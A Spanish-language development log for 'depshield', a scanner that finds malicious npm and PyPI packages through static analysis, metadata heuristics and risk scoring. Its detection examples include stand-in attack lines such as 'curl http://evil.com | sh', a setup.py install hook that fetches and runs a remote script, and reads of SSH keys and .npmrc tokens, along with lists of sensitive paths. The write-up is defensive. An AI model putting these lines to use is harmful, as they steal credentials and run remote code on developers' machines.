- Nodos `Literal` (strings) que contengan alguno de estos patrones: `.ssh`, `.npmrc`, `.env`, `.aws`, `.gnupg`, `/etc/passwd`, `/etc/shadow`, `id_rsa`, `id_ed25519`, `.bash_history`, `.zsh_history`.

**Severidad:** `HIGH` — un paquete legítimo no debería acceder a claves SSH o credenciales del sistema.

**Ejemplo detectado:**
```javascript
fs.readFileSync("/home/user/.ssh/id_rsa");   // HIGH: roba clave SSH
var rc = path.join(homedir, ".npmrc");         // HIGH: roba token npm
```

#### Señal 4: CODE_EXECUTION — Ejecución dinámica de código

Detecta mecanismos para ejecutar código de forma dinámica, lo que se usa frecuentemente para evadir análisis estático y ejecutar payloads descargados en runtime.

**Detección AST:**
- Nodos `CallExpression` cuyo `callee` sea: `eval`, `Function`, `child_process.exec`, `child_process.execSync`, `child_process.spawn`, `child_process.spawnSync`, `child_process.fork`.
- Nodos `NewExpression` cuyo `callee` sea `Function` (para capturar `new Function("...")`).
- Nodos `CallExpression` donde `require('child_process')` sea el argumento.

**Nota técnica:** La detección de `new Function()` requirió una corrección durante el desarrollo, ya que esprima representa `new Function()` como un nodo `NewExpression` (no `CallExpression`). La primera versión del analizador solo buscaba en `CallExpression` y no detectaba este patrón.

**Severidad:** `HIGH` — la ejecución dinámica de código es una de las técnicas más peligrosas.

**Ejemplo detectado:**
```javascript
eval(Buffer.from(encoded, 'base64').toString());  // HIGH: ejecuta payload
var fn = new Function("return " + data);           // HIGH: constructor dinámico
var cp = require("child_process");                 // HIGH: acceso a shell
child_process.exec("curl http://evil.com | sh");   // HIGH: ejecución remota
```

#### Señal 5: OBFUSCATION — Técnicas de ofuscación

Detecta técnicas comúnmente usadas para ocultar el verdadero propósito del código, dificultando la revisión manual y la detección por herramientas de seguridad.

**Detección AST:**
- `Buffer.from(..., 'base64')`: decodificación de Base64, usada para ocultar strings maliciosos.
- `atob(...)`: decodificación de Base64 en el navegador/Node.js moderno.
- `String.fromCharCode(...)` con más de 5 argumentos: construcción de strings carácter a carácter para evadir detección.
- Strings hexadecimales largas (>50 caracteres): payloads codificados en hexadecimal.

**Severidad:**
- `HIGH` para `Buffer.from(base64)`, `String.fromCharCode` masivo.
- `MEDIUM` para `atob()`, strings hexadecimales (pueden ser legítimas, ej. hashes SHA).

**Ejemplo detectado:**
```javascript
// HIGH: decodificación Base64 de payload
var payload = Buffer.from("Y3VybCBodHRwOi8vZXZpbC5jb20=", "base64");

// HIGH: construcción char-by-char para evadir detección
var cmd = String.fromCharCode(99,117,114,108,32,104,116,116,112);

// MEDIUM: string hex larga (podría ser legítima)
var data = "4a6f686e20446f6520736563726574206b6579203132333435";
```

#### Señal 6: INSTALL_SCRIPTS — Scripts de instalación peligrosos

Detecta la presencia de lifecycle scripts en `package.json` que se ejecutan automáticamente durante `npm install`. Esta es una de las técnicas más comunes de ataque: el código malicioso se esconde en un script `postinstall` que se ejecuta sin que el desarrollador lo sepa.

**Detección:** Se parsea el fichero `package.json` y se buscan las claves `preinstall`, `postinstall` y `preuninstall` dentro del objeto `scripts`.

**Nota:** Esta señal no usa AST de JavaScript, sino parsing JSON del `package.json`. Se implementó como una función separada `_check_install_scripts()`.

**Severidad:** `HIGH` — la ejecución automática durante la instalación es el vector de ataque más directo.

**Ejemplo detectado:**
```json
{
  "name": "evil-package",
  "scripts": {
    "postinstall": "node steal-tokens.js",    // HIGH
    "preinstall": "curl http://evil.com | sh"  // HIGH
  }
}
```

### 7.6. Regex fallback — Cobertura para JS moderno

Cuando esprima falla (JSX, TypeScript, ES2020+, optional chaining, etc.), se activa un conjunto de 11 expresiones regulares que cubren las mismas 6 señales:

```python
_REGEX_PATTERNS = [
    ("NETWORK_CALLS", "HIGH",  re.compile(r"\b(fetch|axios|http\.request)\s*\(")),
    ("NETWORK_CALLS", "MEDIUM", re.compile(r"""["']https?://[^"']+["']""")),
    ("ENV_ACCESS",    "HIGH",  re.compile(r"\bprocess\.(env|argv)\b")),
    ("FILE_SENSITIVE","HIGH",  re.compile(r"""["'].*?\.ssh.*?["']""")),
    ("CODE_EXECUTION","HIGH",  re.compile(r"\b(eval|Function)\s*\(")),
    ("CODE_EXECUTION","HIGH",  re.compile(r"""require\s*\(\s*["']child_process["']\)""")),
    ("OBFUSCATION",  "HIGH",  re.compile(r"""Buffer\.from\s*\([^)]+,\s*["']base64["']\)""")),
    ("OBFUSCATION",  "MEDIUM", re.compile(r"\batob\s*\(")),
    # ... etc.
]
```

El fallback recorre el código línea por línea, aplicando cada regex y generando `Finding` con la línea exacta y el fragmento que coincide.

### 7.7. API pública del módulo

```python
# Analizar un solo fichero
def analyze_file(filepath, source=None) -> list[Finding]:
    """Analiza un fichero JS. Usa esprima AST con fallback a regex."""

# Analizar un directorio completo
def analyze_directory(directory) -> list[Finding]:
    """Analiza todos los .js + package.json de un directorio recursivamente."""
```

`analyze_directory()` se usará por el scanner (PASO 8) para analizar cada paquete descargado por el downloader.

### 7.8. Verificación

Se crearon 23 tests unitarios organizados por categoría:

| Categoría | Tests | Descripción |
|---|---|---|
| NETWORK_CALLS | 3 | fetch(), http.request(), URL literal |
| ENV_ACCESS | 2 | process.env, process.argv |
| FILE_SENSITIVE | 3 | .ssh/id_rsa, .npmrc, /etc/passwd |
| CODE_EXECUTION | 4 | eval(), new Function(), require('child_process'), child_process.exec() |
| OBFUSCATION | 4 | Buffer.from(base64), atob(), hex string >50 chars, String.fromCharCode |
| INSTALL_SCRIPTS | 3 | postinstall detectado, preinstall detectado, scripts seguros (0 findings) |
| analyze_directory | 2 | Escaneo de múltiples .js, inclusión de package.json |
| Regex fallback | 1 | Código JSX (esprima falla → regex detecta) |
| Código limpio | 1 | Función `add()` pura → 0 findings |

**Resultado:** 23/23 PASSED en 0.21 segundos.

El test de `new Function()` fue especialmente revelador: en la primera ejecución falló porque `new Function("return 1")` genera un nodo `NewExpression` en el AST de esprima, no un `CallExpression`. Esto obligó a añadir detección explícita de `NewExpression` en el checker de `CODE_EXECUTION`.

### 7.9. Commit

```powershell
git add .
git commit -m "PASO 4: JavaScript static analyzer with esprima AST and regex fallback (6 signal types)"
git push origin main
```

---

## 8. PASO 5 — Analizador estático de Python

**Objetivo:** Crear un módulo equivalente al analizador de JavaScript (PASO 4), pero orientado a código Python. El análisis debe detectar las mismas categorías de comportamiento sospechoso adaptadas a las construcciones del lenguaje Python, usando exclusivamente el módulo `ast` de la librería estándar (sin dependencias externas).

### 8.1. Módulo creado: `depshield/analyzers/py_analyzer.py`

Se añadió el segundo analizador al subpaquete `depshield/analyzers/`:

```
depshield/analyzers/
├── __init__.py
├── js_analyzer.py        # ✅ PASO 4
└── py_analyzer.py        # ✅ PASO 5
```

### 8.2. Decisión de diseño: reutilización del modelo `Finding`

En lugar de crear un modelo de datos separado, se reutiliza la clase `Finding` del `js_analyzer`. Esto garantiza que ambos analizadores producen hallazgos con la misma estructura, lo que simplifica enormemente el trabajo del scorer (PASO 7), que recibirá una lista unificada de findings independientemente del lenguaje de origen.

```python
from depshield.analyzers.js_analyzer import Finding
```

### 8.3. Diferencia clave con el JS analyzer: módulo `ast` vs `esprima`

Mientras que el analizador de JavaScript necesita una librería externa (`esprima`) y un fallback a regex, el analizador de Python usa el módulo `ast` de la librería estándar, que forma parte del intérprete de Python. Esto tiene varias ventajas:

1. **0 dependencias externas** — `ast` es parte de Python, no hay que instalar nada.
2. **Soporte completo** — `ast` soporta toda la sintaxis de Python 3.12, incluyendo match/case, walrus operator, f-strings, etc. No necesita fallback a regex.
3. **API más limpia** — `ast.walk(tree)` proporciona un iterador plano sobre todos los nodos, más ergonómico que el `_walk_ast()` recursivo que tuvimos que implementar para esprima.

```python
def analyze_file(filepath, source=None) -> list[Finding]:
    tree = ast.parse(source, filename=str(filepath))
    findings = []
    findings.extend(_check_network(tree, ...))
    findings.extend(_check_env(tree, ...))
    # ... (6 señales)
    return findings
```

Si el fichero tiene un `SyntaxError` (por ejemplo, Python 2 o fichero corrupto), se captura la excepción y se devuelve una lista vacía, de forma similar al fallback del JS analyzer.

### 8.4. Funciones auxiliares para el AST de Python

Se implementaron tres funciones auxiliares:

**`_get_call_name(node)`** — Extrae el nombre punteado de un nodo `ast.Call`. Por ejemplo, para `subprocess.Popen(...)`, resuelve la cadena de atributos `node.func.value.id` → `"subprocess"` + `node.func.attr` → `"Popen"` y devuelve `"subprocess.Popen"`. Soporta cadenas de profundidad arbitraria (ej. `a.b.c.d()`).

```python
def _get_call_name(node: ast.Call) -> str:
    func = node.func
    if isinstance(func, ast.Name):
        return func.id              # eval(...)  →  "eval"
    if isinstance(func, ast.Attribute):
        # Recorre la cadena de atributos hacia atrás
        parts = []
        current = func
        while isinstance(current, ast.Attribute):
            parts.append(current.attr)
            current = current.value
        if isinstance(current, ast.Name):
            parts.append(current.id)
        return ".".join(reversed(parts))  # subprocess.Popen  →  "subprocess.Popen"
    return ""
```

**`_get_import_names(node)`** — Extrae los nombres de módulo de nodos `Import` e `ImportFrom` para detectar imports sospechosos.

**`_snippet(source_lines, lineno)`** — Devuelve el contenido de una línea concreta del código fuente, recortado a 100 caracteres, para incluirlo en el `Finding`.

### 8.5. Las 6 señales de comportamiento malicioso

#### Señal 1: NETWORK_CALLS — Llamadas de red

Adaptada al ecosistema Python, donde las librerías de red son diferentes a las de JavaScript.

**Detección por imports:** Se buscan nodos `Import`/`ImportFrom` que referencien módulos de red:
- `urllib`, `urllib.request`, `urllib.parse`
- `requests`, `httpx`, `aiohttp`
- `http.client`, `http`
- `socket`

**Detección por llamadas:** Se buscan nodos `ast.Call` cuyo nombre resuelto coincida con funciones de red específicas:
- `urllib.request.urlopen`, `urllib.request.urlretrieve`
- `requests.get`, `requests.post`, `requests.put`, `requests.request`
- `httpx.get`, `httpx.post`, `httpx.Client`
- `socket.socket`, `socket.create_connection`

**Severidad:** `MEDIUM` para imports (pueden ser legítimos), `HIGH` para llamadas directas.

**Ejemplo detectado:**
```python
import requests                                  # MEDIUM: import de red
data = requests.get("https://evil.com/steal")    # HIGH: llamada directa
```

#### Señal 2: ENV_ACCESS — Acceso a variables de entorno

En Python, las variables de entorno se acceden a través del módulo `os`.

**Detección AST:**
- Nodos `ast.Attribute` donde `node.value.id == "os"` y `node.attr == "environ"` (detecta tanto `os.environ['KEY']` como `os.environ.get('KEY')`).
- Nodos `ast.Call` con nombre `os.getenv` o `os.environ.get`.

**Severidad:** `HIGH` — como en JavaScript, acceder a variables de entorno desde un paquete de utilidad es sospechoso.

**Ejemplo detectado:**
```python
token = os.environ['NPM_TOKEN']     # HIGH: acceso directo al diccionario
key = os.getenv('AWS_SECRET_KEY')    # HIGH: función getenv
```

#### Señal 3: FILE_SENSITIVE — Acceso a ficheros sensibles

Idéntica en lógica al JS analyzer: se buscan strings literales que contengan rutas sensibles.

**Detección AST:**
- Nodos `ast.Constant` de tipo `str` que contengan: `.ssh`, `.aws`, `.env`, `.gnupg`, `.npmrc`, `/etc/passwd`, `/etc/shadow`, `id_rsa`, `id_ed25519`, `.bash_history`, `.zsh_history`.

**Severidad:** `HIGH`.

**Ejemplo detectado:**
```python
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()   # HIGH
creds = Path.home() / ".aws" / "credentials"              # HIGH
```

#### Señal 4: CODE_EXECUTION — Ejecución dinámica de código

Python tiene un conjunto más amplio de funciones peligrosas que JavaScript, especialmente en el módulo `subprocess`.

**Detección AST:** Nodos `ast.Call` cuyo nombre resuelto sea:
- **Builtins:** `eval`, `exec`, `compile`, `__import__`
- **os:** `os.system`, `os.popen`
- **subprocess:** `subprocess.Popen`, `subprocess.run`, `subprocess.call`, `subprocess.check_output`, `subprocess.check_call`

**Severidad:** `HIGH` — todas estas funciones permiten ejecución de código arbitrario.

**Ejemplo detectado:**
```python
eval(base64.b64decode(payload).decode())           # HIGH: eval de payload
exec(compile(source, "<string>", "exec"))           # HIGH: exec dinámico
os.system("curl http://evil.com | sh")              # HIGH: shell command
subprocess.Popen(["curl", "http://evil.com"])       # HIGH: proceso externo
mod = __import__("os")                              # HIGH: import dinámico
```

#### Señal 5: OBFUSCATION — Técnicas de ofuscación

Las técnicas de ofuscación en Python son diferentes a las de JavaScript, adaptadas al ecosistema del lenguaje.

**Detección AST:**
- **`base64.b64decode`** / **`base64.decodebytes`** — Decodificación de Base64, la técnica más común para ocultar payloads en Python.
- **`codecs.decode`** — Decodificación con codecs (puede usarse para rot13, hex, etc.).
- **`marshal.loads`** — Deserialización de bytecode Python compilado, usada para ocultar código malicioso en formato binario.
- **`compile()` con strings largos** — Si `compile()` recibe un string de más de 200 caracteres como argumento, se considera sospechoso (código ofuscado embebido).
- **Strings hexadecimales largas** (>50 chars) — Payloads codificados.

**Severidad:** `HIGH` para funciones de decodificación y compile con strings largos, `MEDIUM` para hex strings.

**Ejemplo detectado:**
```python
# HIGH: decodificación Base64
payload = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20=")

# HIGH: bytecode serializado
code = marshal.loads(encoded_bytecode)

# HIGH: compile con string largo (>200 chars)
exec(compile("x=1;y=2;z=3;..." * 100, "<s>", "exec"))
```

#### Señal 6: INSTALL_HOOKS — Hooks de instalación en setup.py

Esta señal es **exclusiva del ecosistema Python** y es el equivalente al `INSTALL_SCRIPTS` del JS analyzer. Es una de las técnicas de ataque más sofisticadas: el atacante crea un `setup.py` que sobreescribe los comandos de instalación de setuptools para ejecutar código malicioso durante `pip install`.

**Detección AST (doble):**

1. **Keyword `cmdclass`:** Se buscan nodos `ast.keyword` donde `arg == "cmdclass"` y el valor sea un diccionario que contenga claves como `"install"`, `"develop"`, `"egg_info"`, `"sdist"` o `"build_py"`.

2. **Herencia de clases:** Se buscan nodos `ast.ClassDef` cuyos `bases` incluyan clases con nombre `install`, `develop`, etc. Esto detecta patrones como `class Evil(install)`.

**Restricción importante:** Esta señal **solo se activa para ficheros llamados `setup.py`**. Un fichero llamado `main.py` con una clase que hereda de `install` no generará un finding, ya que la herencia solo es peligrosa en el contexto de `setup.py`.

**Severidad:** `HIGH`.

**Ejemplo detectado:**
```python
# setup.py — ATAQUE CLÁSICO
from setuptools.command.install import install

class PostInstall(install):          # HIGH: herencia de install
    def run(self):
        install.run(self)
        os.system("curl http://evil.com/steal.sh | sh")

setup(
    name="evil-package",
    cmdclass={"install": PostInstall},  # HIGH: cmdclass override
)
```

### 8.6. API pública del módulo

```python
# Analizar un solo fichero .py
def analyze_file(filepath, source=None) -> list[Finding]:
    """Analiza un fichero Python. Usa ast de la librería estándar."""

# Analizar un directorio completo
def analyze_directory(directory) -> list[Finding]:
    """Analiza todos los .py de un directorio recursivamente."""
```

### 8.7. Tabla comparativa: JS analyzer vs Python analyzer

| Aspecto | JS analyzer (PASO 4) | Python analyzer (PASO 5) |
|---|---|---|
| **Parser** | esprima (externo) | ast (librería estándar) |
| **Fallback** | Regex (para JSX/TS) | No necesario |
| **Deps externas** | 1 (esprima) | 0 |
| **Recorrido AST** | `_walk_ast()` manual | `ast.walk()` nativo |
| **Señales** | 6 | 6 |
| **Install hooks** | package.json scripts | setup.py cmdclass |
| **Modelo datos** | `Finding` (definido aquí) | Reutiliza `Finding` del JS |

### 8.8. Verificación

Se crearon 21 tests unitarios organizados por categoría:

| Categoría | Tests | Descripción |
|---|---|---|
| NETWORK_CALLS | 3 | import requests, urllib.request.urlopen, socket.socket |
| ENV_ACCESS | 2 | os.environ['KEY'], os.getenv('KEY') |
| FILE_SENSITIVE | 3 | ~/.ssh/id_rsa, ~/.aws/credentials, /etc/passwd |
| CODE_EXECUTION | 5 | eval(), exec(), os.system(), subprocess.Popen(), \_\_import\_\_() |
| OBFUSCATION | 4 | base64.b64decode, marshal.loads, hex string >50 chars, compile() con string largo |
| INSTALL_HOOKS | 2 | setup.py con cmdclass (detectado), main.py con herencia (no detectado) |
| analyze_directory | 1 | Escaneo recursivo de múltiples .py |
| Código limpio | 1 | Funciones `add()` y `multiply()` puras → 0 findings |

**Resultado:** 21/21 PASSED en 0.03 segundos.

A diferencia del JS analyzer (que requirió una corrección por el bug de `NewExpression`), todos los tests del Python analyzer pasaron a la primera sin ninguna corrección, gracias a la API más predecible del módulo `ast` de Python.

### 8.9. Commit

```powershell
git add .
git commit -m "PASO 5: Python static analyzer with ast module (6 signal types, 0 external deps)"
git push origin main
```

---

## 9. PASO 6 — Analizador de metadatos

**Objetivo:** Crear un tercer analizador que evalúe la **metadata** de los paquetes (información del registro, no del código fuente) para detectar señales de comportamiento sospechoso. A diferencia de los analizadores de JS y Python que inspeccionan el código, este módulo examina propiedades como la antigüedad del paquete, el número de descargas, la presencia de repositorio, los maintainers, y la similitud del nombre con paquetes populares.

### 9.1. Módulo creado: `depshield/analyzers/metadata_analyzer.py`

Se añadió el tercer y último analizador al subpaquete:

```
depshield/analyzers/
├── __init__.py
├── js_analyzer.py          # ✅ PASO 4 — análisis de código JS
├── py_analyzer.py          # ✅ PASO 5 — análisis de código Python
└── metadata_analyzer.py    # ✅ PASO 6 — análisis de metadatos
```

Con este módulo se completa el tridente de análisis de depshield: **código JS + código Python + metadatos**. El scorer (PASO 7) recibirá los findings de los tres analizadores para calcular una puntuación de riesgo unificada.

### 9.2. Diferencia fundamental con los otros analizadores

| Aspecto | JS/Python analyzers | Metadata analyzer |
|---|---|---|
| **Qué analiza** | Código fuente (AST) | Datos del registro (JSON API) |
| **Input** | Ficheros .js / .py | Diccionario de metadatos |
| **Requiere descarga** | Sí (PASO 3) | No |
| **Tipo de detección** | Patrones en código | Heurísticas sobre metadatos |
| **Velocidad** | Milisegundos (parsing local) | Segundos (requiere API calls) |

### 9.3. Las 8 señales de metadatos

#### Señal 1: YOUNG_PACKAGE — Paquete recién publicado

Un paquete publicado hace menos de 30 días es inherentemente más sospechoso que uno establecido, ya que los atacantes crean paquetes nuevos para cada campaña de ataque.

**Detección:** Se compara el campo `created` (timestamp de la primera publicación) con la fecha actual. Si la diferencia es menor a 30 días, se genera un finding.

**Manejo de formatos:** El timestamp puede llegar en formato ISO 8601 (npm: `"2024-01-15T12:00:00.000Z"`) o como objeto `datetime`. Se normalizan ambos formatos con `fromisoformat()`.

```python
def _check_young_package(metadata, pkg_name):
    created_dt = datetime.fromisoformat(metadata["created"].replace("Z", "+00:00"))
    age_days = (now - created_dt).days
    if age_days < 30:
        return Finding("YOUNG_PACKAGE", "MEDIUM", pkg_name, 0,
                       f"Package first published {age_days} days ago")
```

**Severidad:** `MEDIUM` — muchos paquetes legítimos son nuevos, pero la novedad es un factor de riesgo real.

#### Señal 2: LOW_DOWNLOADS — Pocas descargas

Un paquete con muy pocas descargas semanales tiene menos escrutinio comunitario, lo que lo hace más susceptible de contener código malicioso sin ser detectado.

**Detección:** Se compara el campo `weekly_downloads` con un umbral que varía según el ecosistema:
- **npm:** < 100 descargas/semana
- **PyPI:** < 50 descargas/semana (PyPI tiene menos volumen global)

**Nota sobre PyPI:** La API pública de PyPI no expone fácilmente las descargas semanales (requiere BigQuery). Para este MVP, el campo se deja como `None` para PyPI y solo se evalúa cuando está disponible.

**Severidad:** `LOW` — las descargas bajas no son inherentemente maliciosas; muchos paquetes nicho legítimos tienen pocas descargas.

#### Señal 3: NO_REPOSITORY — Sin repositorio de código

Un paquete sin enlace a su repositorio de código fuente (GitHub, GitLab, etc.) dificulta la auditoría manual y sugiere que el autor no quiere que el código sea revisado fácilmente.

**Detección:** Se verifican los campos `repository` y `homepage`. Si ambos están vacíos o ausentes, se genera un finding.

**Severidad:** `MEDIUM`.

#### Señal 4: SINGLE_MAINTAINER — Un solo mantenedor

Un paquete mantenido por una sola persona sin historial es más susceptible de account takeover o de ser un paquete creado ad-hoc por un atacante.

**Detección:** Se cuenta el número de maintainers en la lista `maintainers`. Si hay exactamente uno, se genera un finding.

**Severidad:** `LOW` — muchos paquetes legítimos tienen un solo mantenedor.

#### Señal 5: VERSION_ANOMALY — Ráfaga de versiones

La publicación de más de 5 versiones en un periodo de 24 horas es un patrón típico de ataques, donde el atacante publica múltiples versiones rápidamente buscando que alguna sea instalada por un sistema de CI/CD configurado con rangos de versión abiertos.

**Detección — Algoritmo de ventana deslizante:**

Se implementó un algoritmo de ventana deslizante (*sliding window*) sobre los timestamps de todas las versiones publicadas:

```python
def _check_version_anomaly(metadata, pkg_name):
    timestamps.sort()
    window = timedelta(hours=24)
    for i in range(len(timestamps)):
        count = 0
        for j in range(i, len(timestamps)):
            if timestamps[j] - timestamps[i] <= window:
                count += 1
            else:
                break
        if count > 5:
            return Finding("VERSION_ANOMALY", "HIGH", pkg_name, 0,
                          f"{count} versions published within 24h")
```

El algoritmo ordena los timestamps, y para cada posición `i` cuenta cuántas versiones caen dentro de las siguientes 24 horas. Si alguna ventana contiene más de 5, se genera un finding.

**Severidad:** `HIGH` — una ráfaga de versiones es altamente anómala para cualquier paquete legítimo.

#### Señal 6: TYPOSQUATTING — Nombre similar a paquete popular

El **typosquatting** es uno de los vectores de ataque más comunes en registros de paquetes. El atacante publica un paquete con un nombre casi idéntico a uno popular (ej. `reqeusts` → `requests`, `lodassh` → `lodash`) esperando que un desarrollador cometa un typo al teclear el nombre.

**Detección — Algoritmo de Levenshtein:**

Se implementó el algoritmo de **distancia de edición de Levenshtein** desde cero (sin librerías externas) usando programación dinámica con optimización de espacio:

```python
def _levenshtein(a: str, b: str) -> int:
    """Distancia de edición entre dos strings."""
    if len(a) < len(b):
        return _levenshtein(b, a)
    if len(b) == 0:
        return len(a)

    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            cost = 0 if ca == cb else 1
            curr.append(min(
                curr[j] + 1,       # inserción
                prev[j + 1] + 1,   # eliminación
                prev[j] + cost,    # sustitución
            ))
        prev = curr
    return prev[-1]
```

El algoritmo tiene complejidad temporal O(n·m) y espacial O(min(n,m)), ya que solo mantiene dos filas de la matriz en memoria (la actual y la anterior), en lugar de la matriz completa.

Si la distancia del nombre del paquete a algún paquete popular es ≤ 2 (y no es 0, que significaría que ES el paquete popular), se genera un finding.

**Listas de paquetes populares:**

Se incluyeron listas hardcodeadas de los 100 paquetes más populares de cada ecosistema:

- **`_POPULAR_NPM`** (100 paquetes): lodash, react, express, chalk, webpack, axios, typescript, jest, next, vue, jquery, etc.
- **`_POPULAR_PYPI`** (100 paquetes): requests, numpy, setuptools, pip, boto3, flask, django, fastapi, pandas, scikit-learn, tensorflow, torch, etc.

**Severidad:** `HIGH` — el typosquatting es el vector de ataque más directo y documentado.

**Ejemplo:**
```
Paquete analizado: "requets"
Paquete popular:   "requests"
Distancia:         1 (una transposición)
→ TYPOSQUATTING: Name similar to popular package 'requests' (distance: 1)
```

#### Señal 7: NO_LICENSE — Sin licencia

Un paquete sin licencia definida es sospechoso desde el punto de vista legal y de seguridad: un paquete legítimo casi siempre tiene una licencia (MIT, Apache, ISC, etc.).

**Detección:** Se verifica que el campo `license` no esté vacío.

**Severidad:** `LOW`.

#### Señal 8: DESCRIPTION_MISMATCH — Descripción ausente o muy corta

Un paquete sin descripción o con una descripción de menos de 10 caracteres puede ser un indicador de un paquete creado rápidamente sin esfuerzo, típico de ataques de typosquatting masivo.

**Detección:** Se verifica que `description` tenga al menos 10 caracteres tras recortar espacios.

**Severidad:** `LOW`.

### 9.4. Fetchers de metadatos

Se implementaron dos funciones para obtener y normalizar los metadatos desde las APIs de los registros:

#### `fetch_npm_metadata(name) → dict`

Realiza **dos peticiones HTTP**:
1. `GET registry.npmjs.org/{name}` → metadata general, timestamps de versiones, maintainers, licencia, descripción, repositorio.
2. `GET api.npmjs.org/downloads/point/last-week/{name}` → descargas semanales (API separada de npm).

```python
def fetch_npm_metadata(name):
    data = requests.get(f"https://registry.npmjs.org/{name}").json()
    downloads = requests.get(f"https://api.npmjs.org/downloads/point/last-week/{name}").json()
    return {
        "ecosystem": "npm",
        "created": data["time"]["created"],
        "weekly_downloads": downloads.get("downloads"),
        "repository": data["versions"][latest]["repository"]["url"],
        "maintainers": [m["name"] for m in data["maintainers"]],
        "version_timestamps": [v for k, v in data["time"].items() if k not in ("created", "modified")],
        "license": data["versions"][latest]["license"],
        "description": data["description"],
    }
```

#### `fetch_pypi_metadata(name) → dict`

Realiza **una petición HTTP**:
1. `GET pypi.org/pypi/{name}/json` → metadata general.

Los timestamps de versiones se extraen de `releases[version][0].upload_time_iso_8601`. La fecha de creación se calcula como el mínimo de todos los timestamps.

```python
def fetch_pypi_metadata(name):
    data = requests.get(f"https://pypi.org/pypi/{name}/json").json()
    info = data["info"]
    return {
        "ecosystem": "pypi",
        "created": min(timestamps),
        "weekly_downloads": None,  # PyPI no lo expone fácilmente
        "repository": info["project_urls"]["Source"] or info["home_page"],
        "maintainers": [info["author"]],
        "version_timestamps": timestamps,
        "license": info["license"],
        "description": info["summary"],
    }
```

Ambos fetchers devuelven un diccionario normalizado con las mismas claves, lo que permite que `analyze_metadata()` funcione de forma agnóstica al ecosistema.

### 9.5. API pública del módulo

```python
# Obtener metadatos normalizados
def fetch_npm_metadata(name: str) -> dict[str, Any]
def fetch_pypi_metadata(name: str) -> dict[str, Any]

# Analizar metadatos
def analyze_metadata(metadata: dict, pkg_name: str) -> list[Finding]

# Utilidad: distancia de Levenshtein
def _levenshtein(a: str, b: str) -> int
```

### 9.6. Verificación

Se crearon 25 tests organizados por categoría:

| Categoría | Tests | Descripción |
|---|---|---|
| Levenshtein | 4 | Strings iguales (dist=0), 1 char de diferencia, 2 chars, transposición |
| YOUNG_PACKAGE | 2 | Paquete de 1 día (detectado), paquete de 1 año (no detectado) |
| LOW_DOWNLOADS | 3 | npm < 100 (detectado), npm > 10000 (no detectado), PyPI < 50 (detectado) |
| NO_REPOSITORY | 2 | Sin repo (detectado), con repo GitHub (no detectado) |
| SINGLE_MAINTAINER | 2 | 1 maintainer (detectado), 2 maintainers (no detectado) |
| VERSION_ANOMALY | 2 | 7 versiones en 1h (detectado), 5 versiones en 5 meses (no detectado) |
| TYPOSQUATTING | 3 | "requets" → "requests" (detectado), "lodash" exacto (no detectado), nombre único (no detectado) |
| NO_LICENSE | 2 | Sin licencia (detectado), con MIT (no detectado) |
| DESCRIPTION_MISMATCH | 3 | Vacía (detectado), "test" 4 chars (detectado), descripción completa (no detectado) |
| Fetchers live | 2 | fetch_npm_metadata("lodash"), fetch_pypi_metadata("requests") |

**Resultado:** 25/25 PASSED en 1.23 segundos.

Todos los tests pasaron a la primera sin correcciones necesarias. Los tests de integración (fetchers live) confirman que la normalización de metadatos funciona correctamente con datos reales de las APIs de npm y PyPI.

### 9.7. Resumen de las 3 capas de análisis completadas

Con el PASO 6, se completa el sistema de detección de depshield. El siguiente diagrama muestra las 3 capas de análisis:

```
┌─────────────────────────────────────────────────────┐
│                    PAQUETE                           │
├──────────────┬──────────────┬───────────────────────┤
│  Código JS   │  Código Py   │      Metadatos        │
│  (PASO 4)    │  (PASO 5)    │      (PASO 6)         │
├──────────────┼──────────────┼───────────────────────┤
│ 6 señales:   │ 6 señales:   │ 8 señales:            │
│ NETWORK_CALLS│ NETWORK_CALLS│ YOUNG_PACKAGE         │
│ ENV_ACCESS   │ ENV_ACCESS   │ LOW_DOWNLOADS         │
│ FILE_SENSITIVE│FILE_SENSITIVE│NO_REPOSITORY          │
│ CODE_EXEC    │ CODE_EXEC    │ SINGLE_MAINTAINER     │
│ OBFUSCATION  │ OBFUSCATION  │ VERSION_ANOMALY       │
│ INSTALL_SCRIP│ INSTALL_HOOKS│ TYPOSQUATTING         │
│              │              │ NO_LICENSE            │
│              │              │ DESCRIPTION_MISMATCH  │
├──────────────┴──────────────┴───────────────────────┤
│           → SCORER (PASO 7) → REPORT                │
└─────────────────────────────────────────────────────┘
```

Total: **20 señales únicas** de comportamiento sospechoso, con severidades HIGH/MEDIUM/LOW.

### 9.8. Commit

```powershell
git add .
git commit -m "PASO 6: Metadata analyzer with 8 signal types (typosquatting, version anomaly, etc.)"
git push origin main
```

---

## 10. PASO 7 — Motor de scoring y generador de informes

**Objetivo:** Crear un sistema de puntuación que reciba todos los findings de los tres analizadores (JS, Python, metadatos) para cada paquete y calcule una puntuación de riesgo normalizada (0–100), junto con un generador de informes que presente los resultados de forma clara tanto en terminal como en formato JSON para integración con pipelines de CI/CD.

### 10.1. Módulos creados

Se creó el subpaquete `depshield/scoring/`:

```
depshield/scoring/
├── __init__.py
├── scorer.py       # Motor de puntuación
└── report.py       # Generador de informes (terminal + JSON)
```

### 10.2. Modelo de datos — `PackageScore`

Se definió un dataclass que encapsula el resultado de la evaluación de riesgo de un paquete individual:

```python
@dataclass
class PackageScore:
    name: str                # Nombre del paquete
    version: str             # Versión resuelta
    score: int               # Puntuación 0–100
    classification: str      # SAFE / LOW_RISK / MEDIUM_RISK / HIGH_RISK
    findings: list[Finding]  # Hallazgos ordenados por severidad
    is_direct: bool = True   # ¿Es dependencia directa o transitiva?
```

Además, se incluyeron tres **properties** de conveniencia para acceder rápidamente a los conteos por severidad sin iterar manualmente:

```python
@property
def high_count(self) -> int:
    return sum(1 for f in self.findings if f.severity == "HIGH")

@property
def medium_count(self) -> int:
    return sum(1 for f in self.findings if f.severity == "MEDIUM")

@property
def low_count(self) -> int:
    return sum(1 for f in self.findings if f.severity == "LOW")
```

Y un método `findings_by_severity` que agrupa los findings en un diccionario `{"HIGH": [...], "MEDIUM": [...], "LOW": [...]}` para uso del report.

### 10.3. Sistema de puntuación

#### Pesos por severidad

Cada finding contribuye a la puntuación total según su severidad:

| Severidad | Puntos | Justificación |
|---|---|---|
| **HIGH** | +25 | Un finding HIGH implica riesgo directo (eval, exfiltración, typosquatting) |
| **MEDIUM** | +10 | Riesgo moderado (import de red, paquete joven, sin repositorio) |
| **LOW** | +3 | Señal menor (pocas descargas, sin licencia, un mantenedor) |

